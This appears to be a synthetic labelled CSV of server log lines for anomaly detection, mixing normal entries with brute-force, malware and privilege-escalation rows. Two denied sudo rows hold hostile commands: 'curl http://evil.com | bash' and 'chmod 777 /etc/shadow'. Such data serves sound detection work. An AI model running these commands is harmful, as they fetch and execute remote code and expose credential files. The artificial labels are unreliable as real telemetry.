timestamp,log_message,label,anomaly_type
2026-01-04 02:46:27,[INFO] User mysql logged in successfully,0,normal
2026-01-04 02:46:51,"192.168.85.195 - - [04/Jan/2026:18:25:50 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 02:46:58,systemd[1]: Started docker.service,0,normal
2026-01-04 02:47:07,"185.220.178.18 - - [04/Jan/2026:19:01:32 +0700] ""POST /login HTTP/1.1"" 401 11553",1,suspicious_network
2026-01-04 02:47:08,session opened for user apache by (uid=0),0,normal
2026-01-04 02:47:13,"192.168.196.29 - - [04/Jan/2026:00:00:16 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 02:47:16,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:47:24,"192.168.175.26 - - [04/Jan/2026:06:36:18 +0700] ""POST /images/logo.png HTTP/1.1"" 200 37999",0,normal
2026-01-04 02:47:26,[INFO] Request processed in 3463ms,0,normal
2026-01-04 02:47:28,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.42.57.192,1,brute_force
2026-01-04 02:47:38,"192.168.99.123 - - [04/Jan/2026:05:46:19 +0700] ""POST /api/v1/data HTTP/1.1"" 200 19979",0,normal
2026-01-04 02:47:40,kernel: [974.720646] eth1: link up,0,normal
2026-01-04 02:47:49,systemd[1]: Started cron.service,0,normal
2026-01-04 02:47:51,kernel: [307.897725] docker0: link down,0,normal
2026-01-04 02:47:51,ALERT: Rootkit signature detected in /dashboard,1,malware_indicator
2026-01-04 02:48:20,Accepted password for admin from 192.168.92.120 port 49620 ssh2,0,normal
2026-01-04 02:48:23,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:48:24,[DEBUG] Processing request from 192.168.116.11,0,normal
2026-01-04 02:48:25,"192.168.202.195 - - [04/Jan/2026:02:53:32 +0700] ""POST /admin HTTP/1.1"" 200 26971",0,normal
2026-01-04 02:48:41,Received disconnect from 192.168.187.77 port 23999:11: disconnected by user,0,normal
2026-01-04 02:48:49,[INFO] Application started successfully,0,normal
2026-01-04 02:49:08,"192.168.244.241 - - [04/Jan/2026:17:07:52 +0700] ""GET /css/style.css HTTP/1.1"" 200 29775",0,normal
2026-01-04 02:49:11,session closed for user www-data,0,normal
2026-01-04 02:49:14,"192.168.90.206 - - [04/Jan/2026:08:44:44 +0700] ""GET /images/logo.png HTTP/1.1"" 200 10312",0,normal
2026-01-04 02:49:22,[INFO] User nginx logged in successfully,0,normal
2026-01-04 02:49:29,kernel: Out of memory: Kill process 34119 (ransomware) score 889,1,system_error
2026-01-04 02:49:31,session opened for user root by (uid=0),0,normal
2026-01-04 02:49:37,"192.168.138.209 - - [03/Jan/2026:23:32:07 +0700] ""GET /login HTTP/1.1"" 200 8100",0,normal
2026-01-04 02:49:53,session closed for user www-data,0,normal
2026-01-04 02:50:34,kernel: [873.810168] docker0: link down,0,normal
2026-01-04 02:50:38,Received disconnect from 192.168.172.199 port 45352:11: disconnected by user,0,normal
2026-01-04 02:50:44,[INFO] Request processed in 1125ms,0,normal
2026-01-04 02:50:46,apache: user NOT in sudoers; TTY=pts/0; PWD=/home/apache; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 02:50:57,[INFO] Application started successfully,0,normal
2026-01-04 02:51:07,"192.168.253.129 - - [04/Jan/2026:05:42:17 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 02:51:18,session opened for user guest by (uid=0),0,normal
2026-01-04 02:51:39,[INFO] Cache hit for key: cache_key_471,0,normal
2026-01-04 02:51:52,Blocked suspicious request from 104.248.156.92: /admin,1,suspicious_network
2026-01-04 02:51:56,[DEBUG] Processing request from 192.168.142.123,0,normal
2026-01-04 02:51:57,Connection received: host=192.168.160.181 user=apache database=users,0,normal
2026-01-04 02:52:12,[INFO] Cache hit for key: cache_key_511,0,normal
2026-01-04 02:52:14,WARNING: Cryptominer activity detected on process 16896,1,malware_indicator
2026-01-04 02:52:16,systemd[1]: Started docker.service,0,normal
2026-01-04 02:52:19,[INFO] Request processed in 1321ms,0,normal
2026-01-04 02:52:24,session closed for user root,0,normal
2026-01-04 02:52:25,systemd[1]: Stopped redis.service,0,normal
2026-01-04 02:52:43,systemd[1]: Starting redis.service...,0,normal
2026-01-04 02:53:02,[INFO] Application started successfully,0,normal
2026-01-04 02:53:18,systemd[1]: Started ssh.service,0,normal
2026-01-04 02:53:30,Connection received: host=192.168.140.13 user=root database=staging,0,normal
2026-01-04 02:53:49,session closed for user user,0,normal
2026-01-04 02:53:55,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 02:54:16,Received disconnect from 192.168.198.185 port 1700:11: disconnected by user,0,normal
2026-01-04 02:54:29,su: FAILED SU (to root) postgres on pts/0,1,privilege_escalation
2026-01-04 02:54:38,Accepted password for mysql from 192.168.73.47 port 50135 ssh2,0,normal
2026-01-04 02:54:50,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:55:06,MySQL server started with process id 45293,0,normal
2026-01-04 02:55:16,[INFO] Cache hit for key: cache_key_355,0,normal
2026-01-04 02:55:21,Connection received: host=192.168.23.1 user=www-data database=users,0,normal
2026-01-04 02:55:26,session closed for user mysql,0,normal
2026-01-04 02:55:29,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 02:55:31,PAM: Authentication failure for admin from 104.248.211.207,1,brute_force
2026-01-04 02:55:35,"192.168.200.159 - - [04/Jan/2026:05:10:34 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 02:55:36,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:55:38,[INFO] Application started successfully,0,normal
2026-01-04 02:55:48,Connection received: host=192.168.115.240 user=root database=production,0,normal
2026-01-04 02:55:56,session closed for user root,0,normal
2026-01-04 02:56:04,[INFO] User nginx logged in successfully,0,normal
2026-01-04 02:56:15,[INFO] User root logged in successfully,0,normal
2026-01-04 02:56:25,session opened for user apache by (uid=0),0,normal
2026-01-04 02:56:32,"192.168.161.83 - - [04/Jan/2026:19:49:19 +0700] ""GET / HTTP/1.1"" 200 2358",0,normal
2026-01-04 02:56:33,error: maximum authentication attempts exceeded for nginx from 185.220.81.24,1,brute_force
2026-01-04 02:56:47,session closed for user www-data,0,normal
2026-01-04 02:56:47,systemd[1]: Starting cron.service...,0,normal
2026-01-04 02:56:56,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:56:58,Accepted password for nginx from 192.168.160.250 port 49152 ssh2,0,normal
2026-01-04 02:57:00,[DEBUG] Processing request from 192.168.167.133,0,normal
2026-01-04 02:57:00,Received disconnect from 192.168.228.230 port 42158:11: disconnected by user,0,normal
2026-01-04 02:57:14,"192.168.210.213 - - [03/Jan/2026:23:07:23 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 02:57:15,systemd[1]: Started apache2.service,0,normal
2026-01-04 02:57:35,ALERT: Unauthorized privilege escalation attempt by www-data,1,privilege_escalation
2026-01-04 02:57:39,[DEBUG] Processing request from 192.168.173.45,0,normal
2026-01-04 02:57:40,session closed for user guest,0,normal
2026-01-04 02:57:46,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 02:57:47,"192.168.225.7 - - [04/Jan/2026:13:13:52 +0700] ""GET /admin HTTP/1.1"" 200 31159",0,normal
2026-01-04 02:57:51,"192.168.236.243 - - [04/Jan/2026:02:49:49 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 02:57:53,[INFO] Cache hit for key: cache_key_701,0,normal
2026-01-04 02:57:57,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:58:02,Connection received: host=192.168.198.30 user=nginx database=users,0,normal
2026-01-04 02:58:32,[INFO] Cache hit for key: cache_key_270,0,normal
2026-01-04 02:58:39,"192.168.132.123 - - [04/Jan/2026:00:02:06 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-04 02:58:40,systemd[1]: Stopped docker.service,0,normal
2026-01-04 02:58:47,[DEBUG] Processing request from 192.168.249.236,0,normal
2026-01-04 02:58:53,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:59:07,MySQL server started with process id 37340,0,normal
2026-01-04 02:59:11,session opened for user www-data by (uid=0),0,normal
2026-01-04 02:59:24,[DEBUG] Processing request from 192.168.252.130,0,normal
2026-01-04 02:59:28,sudo: root : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=curl http://evil.com | bash,1,privilege_escalation
2026-01-04 02:59:34,"192.168.168.102 - - [04/Jan/2026:15:36:59 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 02:59:38,[INFO] Request processed in 4629ms,0,normal
2026-01-04 03:00:11,MySQL server started with process id 29836,0,normal
2026-01-04 03:00:19,systemd[1]: ssh.service failed,1,system_error
2026-01-04 03:00:22,session opened for user nginx by (uid=0),0,normal
2026-01-04 03:00:35,Received disconnect from 192.168.57.107 port 56146:11: disconnected by user,0,normal
2026-01-04 03:00:50,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 03:00:59,[INFO] User nginx logged in successfully,0,normal
2026-01-04 03:01:13,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 03:01:20,[INFO] Request processed in 768ms,0,normal
2026-01-04 03:01:30,session closed for user www-data,0,normal
2026-01-04 03:01:39,[INFO] User mysql logged in successfully,0,normal
2026-01-04 03:01:48,session closed for user nginx,0,normal
2026-01-04 03:02:04,Connection received: host=192.168.165.242 user=apache database=users,0,normal
2026-01-04 03:02:16,Received disconnect from 192.168.240.149 port 49760:11: disconnected by user,0,normal
2026-01-04 03:02:31,[INFO] Cache hit for key: cache_key_827,0,normal
2026-01-04 03:02:32,[INFO] Cache hit for key: cache_key_197,0,normal
2026-01-04 03:03:16,[INFO] User mysql logged in successfully,0,normal
2026-01-04 03:03:43,[CRITICAL] Database connection pool exhausted,1,system_error
2026-01-04 03:03:50,[ERROR] Disk space critical: /home at 99% usage,1,system_error
2026-01-04 03:03:51,"192.168.114.162 - - [04/Jan/2026:00:28:24 +0700] ""POST /index.html HTTP/1.1"" 200 12713",0,normal
2026-01-04 03:04:04,kernel: [386.333726] docker0: link down,0,normal
2026-01-04 03:04:14,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 03:04:30,"kernel: [908.345035] I/O error, dev br-0, sector 7477938",1,system_error
2026-01-04 03:04:37,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 03:04:45,[INFO] User postgres logged in successfully,0,normal
2026-01-04 03:04:54,systemd[1]: Stopped redis.service,0,normal
2026-01-04 03:05:03,Accepted password for www-data from 192.168.118.152 port 15126 ssh2,0,normal
2026-01-04 03:05:04,admin: user NOT in sudoers; TTY=pts/0; PWD=/home/admin; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 03:05:09,"192.168.32.82 - - [04/Jan/2026:17:49:58 +0700] ""POST /admin HTTP/1.1"" 200 41788",0,normal
2026-01-04 03:05:28,session closed for user guest,0,normal
2026-01-04 03:06:04,[INFO] Request processed in 1601ms,0,normal
2026-01-04 03:06:51,Accepted password for mysql from 192.168.87.2 port 43618 ssh2,0,normal
2026-01-04 03:07:06,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 03:07:12,Received disconnect from 192.168.51.113 port 58023:11: disconnected by user,0,normal
2026-01-04 03:07:15,kernel: [183.343716] docker0: link down,0,normal
2026-01-04 03:07:21,Received disconnect from 192.168.86.154 port 39280:11: disconnected by user,0,normal
2026-01-04 03:08:09,session closed for user postgres,0,normal
2026-01-04 03:08:14,ALERT: Suspicious process detected: ransomware (PID: 31672),1,malware_indicator
2026-01-04 03:08:14,session opened for user apache by (uid=0),0,normal
2026-01-04 03:08:24,MySQL server started with process id 13404,0,normal
2026-01-04 03:08:32,WARNING: Cryptominer activity detected on process 36452,1,malware_indicator
2026-01-04 03:08:33,session closed for user postgres,0,normal
2026-01-04 03:08:39,"192.168.235.161 - - [03/Jan/2026:23:06:41 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 20174",0,normal
2026-01-04 03:08:55,Received disconnect from 192.168.70.132 port 30694:11: disconnected by user,0,normal
2026-01-04 03:08:56,kernel: [659.505549] br-0: link down,0,normal
2026-01-04 03:09:12,WARNING: Unauthorized file modification: /css/style.css,1,malware_indicator
2026-01-04 03:09:21,kernel: [775.264096] eth0: link down,0,normal
2026-01-04 03:09:27,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 03:09:43,MySQL server started with process id 55616,0,normal
2026-01-04 03:09:47,[DEBUG] Processing request from 192.168.62.40,0,normal
2026-01-04 03:09:55,systemd[1]: Started cron.service,0,normal
2026-01-04 03:10:30,kernel: [755.347403] eth1: link up,0,normal
2026-01-04 03:10:31,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 03:10:49,session closed for user apache,0,normal
2026-01-04 03:10:56,[INFO] User www-data logged in successfully,0,normal
2026-01-04 03:11:02,[INFO] Application started successfully,0,normal
2026-01-04 03:11:08,kernel: BUG: soft lockup - CPU#7 stuck for 152s!,1,system_error
2026-01-04 03:11:10,Received disconnect from 192.168.15.118 port 36786:11: disconnected by user,0,normal
2026-01-04 03:11:19,MySQL server started with process id 42784,0,normal
2026-01-04 03:11:20,session opened for user user by (uid=0),0,normal
2026-01-04 03:11:27,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 03:11:42,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 03:11:48,systemd[1]: Started mongodb.service,0,normal
2026-01-04 03:12:03,[DEBUG] Processing request from 192.168.82.28,0,normal
2026-01-04 03:12:03,systemd[1]: Started apache2.service,0,normal
2026-01-04 03:12:07,systemd[1]: Stopped docker.service,0,normal
2026-01-04 03:12:08,systemd[1]: Started postgresql.service,0,normal
2026-01-04 03:12:11,kernel: [351.993500] eth0: link down,0,normal
2026-01-04 03:12:14,kernel: [669.822096] docker0: link up,0,normal
2026-01-04 03:12:31,[INFO] Request processed in 125ms,0,normal
2026-01-04 03:12:36,[INFO] Request processed in 60ms,0,normal
2026-01-04 03:12:53,MySQL server started with process id 42897,0,normal
2026-01-04 03:12:58,"192.168.195.192 - - [04/Jan/2026:18:58:15 +0700] ""GET /css/style.css HTTP/1.1"" 200 12936",0,normal
2026-01-04 03:13:09,session opened for user root by (uid=0),0,normal
2026-01-04 03:13:17,kernel: [745.780526] docker0: link up,0,normal
2026-01-04 03:13:25,Received disconnect from 192.168.209.136 port 43826:11: disconnected by user,0,normal
2026-01-04 03:13:32,[INFO] Application started successfully,0,normal
2026-01-04 03:13:35,"192.168.166.245 - - [04/Jan/2026:11:37:57 +0700] ""POST / HTTP/1.1"" 200 36500",0,normal
2026-01-04 03:14:51,systemd[1]: Started mysql.service,0,normal
2026-01-04 03:15:21,"192.168.194.212 - - [03/Jan/2026:22:49:06 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 03:15:42,[INFO] Cache hit for key: cache_key_907,0,normal
2026-01-04 03:16:01,Connection received: host=192.168.40.83 user=apache database=staging,0,normal
2026-01-04 03:16:21,Connection received: host=192.168.224.128 user=guest database=users,0,normal
2026-01-04 03:16:22,"192.168.102.43 - - [04/Jan/2026:04:27:54 +0700] ""GET /dashboard HTTP/1.1"" 200 16606",0,normal
2026-01-04 03:16:25,[DEBUG] Processing request from 192.168.1.88,0,normal
2026-01-04 03:16:46,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 03:17:05,session opened for user mysql by (uid=0),0,normal
2026-01-04 03:17:07,Accepted password for apache from 192.168.149.211 port 35486 ssh2,0,normal
2026-01-04 03:17:09,[INFO] User root logged in successfully,0,normal
2026-01-04 03:17:10,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 03:17:11,"192.168.202.120 - - [04/Jan/2026:08:16:04 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 03:17:29,Accepted password for apache from 192.168.16.70 port 27185 ssh2,0,normal
2026-01-04 03:17:30,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.42.61.214,1,brute_force
2026-01-04 03:17:35,systemd[1]: Started postgresql.service,0,normal
2026-01-04 03:17:38,[INFO] Application started successfully,0,normal
2026-01-04 03:17:45,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 03:17:51,Connection received: host=192.168.211.56 user=guest database=production,0,normal
2026-01-04 03:17:55,kernel: [130.860848] br-0: link down,0,normal
2026-01-04 03:17:58,[INFO] Cache hit for key: cache_key_757,0,normal
2026-01-04 03:18:13,[INFO] Cache hit for key: cache_key_178,0,normal
2026-01-04 03:18:13,[INFO] Request processed in 976ms,0,normal
2026-01-04 03:18:31,session closed for user guest,0,normal
2026-01-04 03:18:32,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 03:18:41,[INFO] Request processed in 3025ms,0,normal
2026-01-04 03:18:58,MySQL server started with process id 32714,0,normal
2026-01-04 03:19:01,[INFO] Request processed in 4848ms,0,normal
2026-01-04 03:19:11,session closed for user admin,0,normal
2026-01-04 03:19:42,[INFO] Cache hit for key: cache_key_654,0,normal
2026-01-04 03:19:46,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 03:19:50,kernel: [417.299659] eth1: link up,0,normal
2026-01-04 03:19:54,Accepted password for admin from 192.168.216.64 port 5332 ssh2,0,normal
2026-01-04 03:19:59,[DEBUG] Processing request from 192.168.15.246,0,normal
2026-01-04 03:20:16,[INFO] Application started successfully,0,normal
2026-01-04 03:20:17,"192.168.139.244 - - [04/Jan/2026:17:38:20 +0700] ""GET /images/logo.png HTTP/1.1"" 200 28228",0,normal
2026-01-04 03:20:22,"192.168.111.235 - - [04/Jan/2026:09:35:12 +0700] ""GET /index.html HTTP/1.1"" 200 41132",0,normal
2026-01-04 03:20:24,Connection received: host=192.168.133.143 user=postgres database=staging,0,normal
2026-01-04 03:20:27,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 03:20:39,Connection received: host=192.168.89.250 user=postgres database=staging,0,normal
2026-01-04 03:20:39,kernel: [888.772225] eth0: link down,0,normal
2026-01-04 03:20:51,systemd[1]: Started docker.service,0,normal
2026-01-04 03:20:53,systemd[1]: Stopped docker.service,0,normal
2026-01-04 03:21:10,Connection received: host=192.168.13.160 user=www-data database=production,0,normal
2026-01-04 03:21:12,session opened for user www-data by (uid=0),0,normal
2026-01-04 03:21:32,kernel: [29.454046] docker0: link up,0,normal
2026-01-04 03:21:35,[DEBUG] Processing request from 192.168.60.183,0,normal
2026-01-04 03:21:36,error: maximum authentication attempts exceeded for root from 104.248.250.29,1,brute_force
2026-01-04 03:21:37,[INFO] User apache logged in successfully,0,normal
2026-01-04 03:21:54,systemd[1]: Starting cron.service...,0,normal
2026-01-04 03:21:57,Accepted password for nginx from 192.168.41.97 port 43869 ssh2,0,normal
2026-01-04 03:22:04,Failed password for root from 45.33.132.118 port 64985 ssh2,1,brute_force
2026-01-04 03:22:04,systemd[1]: Started mongodb.service,0,normal
2026-01-04 03:22:10,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 03:22:42,kernel: [313.163725] br-0: link up,0,normal
2026-01-04 03:22:52,Received disconnect from 192.168.186.28 port 22752:11: disconnected by user,0,normal
2026-01-04 03:22:55,session opened for user postgres by (uid=0),0,normal
2026-01-04 03:22:58,"192.168.227.203 - - [04/Jan/2026:18:14:01 +0700] ""POST /admin HTTP/1.1"" 200 32672",0,normal
2026-01-04 03:23:12,[INFO] Request processed in 4632ms,0,normal
2026-01-04 03:23:28,Accepted password for postgres from 192.168.7.185 port 11638 ssh2,0,normal
2026-01-04 03:23:28,[DEBUG] Processing request from 192.168.47.60,0,normal
2026-01-04 03:23:36,Accepted password for nginx from 192.168.196.191 port 43128 ssh2,0,normal
2026-01-04 03:23:40,"192.168.88.98 - - [03/Jan/2026:23:14:02 +0700] ""GET /index.html HTTP/1.1"" 304 0",0,normal
2026-01-04 03:23:44,[INFO] User apache logged in successfully,0,normal
2026-01-04 03:23:49,systemd[1]: Starting docker.service...,0,normal
2026-01-04 03:23:55,Accepted password for admin from 192.168.71.21 port 30801 ssh2,0,normal
2026-01-04 03:24:09,WARNING: Cryptominer activity detected on process 43424,1,malware_indicator
2026-01-04 03:24:15,Received disconnect from 192.168.176.62 port 60157:11: disconnected by user,0,normal
2026-01-04 03:24:18,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 03:24:35,[INFO] User nginx logged in successfully,0,normal
2026-01-04 03:24:38,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 03:24:47,Received disconnect from 192.168.100.147 port 26792:11: disconnected by user,0,normal
2026-01-04 03:24:52,[INFO] Cache hit for key: cache_key_559,0,normal
2026-01-04 03:24:53,Received disconnect from 192.168.61.60 port 37776:11: disconnected by user,0,normal
2026-01-04 03:25:00,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.94.203,1,brute_force
2026-01-04 03:25:04,[DEBUG] Processing request from 192.168.231.76,0,normal
2026-01-04 03:25:12,kernel: Out of memory: Kill process 23843 (keylogger) score 531,1,system_error
2026-01-04 03:25:27,Received disconnect from 192.168.136.2 port 36631:11: disconnected by user,0,normal
2026-01-04 03:25:36,[INFO] Cache hit for key: cache_key_396,0,normal
2026-01-04 03:25:43,[INFO] User postgres logged in successfully,0,normal
2026-01-04 03:25:46,kernel: [145.489992] br-0: link up,0,normal
2026-01-04 03:25:49,kernel: [756.155419] wlan0: link down,0,normal
2026-01-04 03:25:52,[INFO] Application started successfully,0,normal
2026-01-04 03:26:01,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 03:26:06,[DEBUG] Processing request from 192.168.233.98,0,normal
2026-01-04 03:26:07,Connection received: host=192.168.247.233 user=guest database=users,0,normal
2026-01-04 03:26:11,MySQL server started with process id 42457,0,normal
2026-01-04 03:26:12,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 03:26:15,[DEBUG] Processing request from 192.168.120.3,0,normal
2026-01-04 03:26:28,Accepted password for user from 192.168.128.250 port 30976 ssh2,0,normal
2026-01-04 03:26:53,"192.168.24.22 - - [04/Jan/2026:21:13:19 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 03:26:56,kernel: [651.942303] docker0: link up,0,normal
2026-01-04 03:27:03,kernel: [956.800449] br-0: link up,0,normal
2026-01-04 03:27:15,session closed for user root,0,normal
2026-01-04 03:27:18,Accepted password for www-data from 192.168.205.14 port 56952 ssh2,0,normal
2026-01-04 03:27:30,systemd[1]: Started nginx.service,0,normal
2026-01-04 03:27:31,systemd[1]: Starting cron.service...,0,normal
2026-01-04 03:27:31,kernel: [38.532832] eth1: link down,0,normal
2026-01-04 03:27:55,ALERT: Suspicious process detected: reverse_shell (PID: 46424),1,malware_indicator
2026-01-04 03:27:58,kernel: [950.106810] eth0: link down,0,normal
2026-01-04 03:28:00,Blocked suspicious request from 45.33.215.171: /css/style.css,1,suspicious_network
2026-01-04 03:28:14,[INFO] Application started successfully,0,normal
2026-01-04 03:28:19,PAM: Authentication failure for user from 185.220.83.136,1,brute_force
2026-01-04 03:28:19,kernel: [184.547563] br-0: link up,0,normal
2026-01-04 03:28:34,systemd[1]: Started cron.service,0,normal
2026-01-04 03:28:47,MySQL server started with process id 57128,0,normal
2026-01-04 03:29:56,root: user NOT in sudoers; TTY=pts/0; PWD=/home/root; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 03:29:57,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 03:30:00,kernel: [550.859906] br-0: link up,0,normal
2026-01-04 03:30:06,kernel: [450.977494] eth1: link up,0,normal
2026-01-04 03:30:07,"192.168.42.130 - - [04/Jan/2026:04:20:55 +0700] ""POST /api/v1/data HTTP/1.1"" 200 7694",0,normal
2026-01-04 03:30:09,Accepted password for guest from 192.168.181.107 port 20543 ssh2,0,normal
2026-01-04 03:30:10,session closed for user root,0,normal
2026-01-04 03:30:17,systemd[1]: Stopped redis.service,0,normal
2026-01-04 03:30:34,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 03:30:56,[INFO] Cache hit for key: cache_key_538,0,normal
2026-01-04 03:31:21,Accepted password for postgres from 192.168.89.140 port 49650 ssh2,0,normal
2026-01-04 03:31:31,systemd[1]: Started ssh.service,0,normal
2026-01-04 03:31:32,[INFO] Application started successfully,0,normal
2026-01-04 03:31:35,kernel: BUG: soft lockup - CPU#4 stuck for 3982s!,1,system_error
2026-01-04 03:31:43,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 03:31:48,kernel: [268.730144] br-0: link up,0,normal
2026-01-04 03:32:02,"192.168.60.53 - - [04/Jan/2026:21:54:25 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 03:32:15,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.42.49.16,1,brute_force
2026-01-04 03:32:16,su: FAILED SU (to root) user on pts/0,1,privilege_escalation
2026-01-04 03:32:29,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 03:32:32,Connection received: host=192.168.235.231 user=root database=staging,0,normal
2026-01-04 03:32:33,[INFO] Cache hit for key: cache_key_574,0,normal
2026-01-04 03:32:34,"192.168.171.111 - - [03/Jan/2026:22:17:14 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 03:32:39,Connection received: host=192.168.5.190 user=guest database=staging,0,normal
2026-01-04 03:32:41,WARNING: Unauthorized file modification: /api/v1/data,1,malware_indicator
2026-01-04 03:33:00,session closed for user nginx,0,normal
2026-01-04 03:33:24,session opened for user mysql by (uid=0),0,normal
2026-01-04 03:33:27,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 03:33:36,"192.168.92.179 - - [04/Jan/2026:12:49:21 +0700] ""POST /api/v1/users HTTP/1.1"" 200 36143",0,normal
2026-01-04 03:33:38,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.240.43,1,brute_force
2026-01-04 03:33:55,kernel: [881.797375] docker0: link up,0,normal
2026-01-04 03:34:06,kernel: Out of memory: Kill process 9279 (keylogger) score 878,1,system_error
2026-01-04 03:34:10,"192.168.170.130 - - [04/Jan/2026:04:03:06 +0700] ""POST /api/v1/data HTTP/1.1"" 200 32079",0,normal
2026-01-04 03:34:23,"192.168.177.94 - - [04/Jan/2026:08:19:40 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 03:34:24,"192.168.59.125 - - [04/Jan/2026:17:13:15 +0700] ""GET /api/v1/users HTTP/1.1"" 200 32871",0,normal
2026-01-04 03:34:30,session opened for user guest by (uid=0),0,normal
2026-01-04 03:34:36,"192.168.206.75 - - [04/Jan/2026:01:11:45 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 03:34:40,session closed for user www-data,0,normal
2026-01-04 03:34:46,Received disconnect from 192.168.132.125 port 60213:11: disconnected by user,0,normal
2026-01-04 03:34:47,session opened for user apache by (uid=0),0,normal
2026-01-04 03:34:51,session opened for user apache by (uid=0),0,normal
2026-01-04 03:34:54,[INFO] Application started successfully,0,normal
2026-01-04 03:34:59,systemd[1]: Stopped redis.service,0,normal
2026-01-04 03:35:04,sudo: user : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=chmod 777 /etc/shadow,1,privilege_escalation
2026-01-04 03:35:12,MySQL server started with process id 42380,0,normal
2026-01-04 03:35:23,[DEBUG] Processing request from 192.168.27.218,0,normal
2026-01-04 03:35:23,session closed for user guest,0,normal
2026-01-04 03:35:27,MySQL server started with process id 29166,0,normal
2026-01-04 03:35:30,"kernel: [76.456259] I/O error, dev docker0, sector 1209013",1,system_error
2026-01-04 03:35:33,[INFO] Application started successfully,0,normal
2026-01-04 03:35:42,systemd[1]: Starting mongodb.service...,0,normal
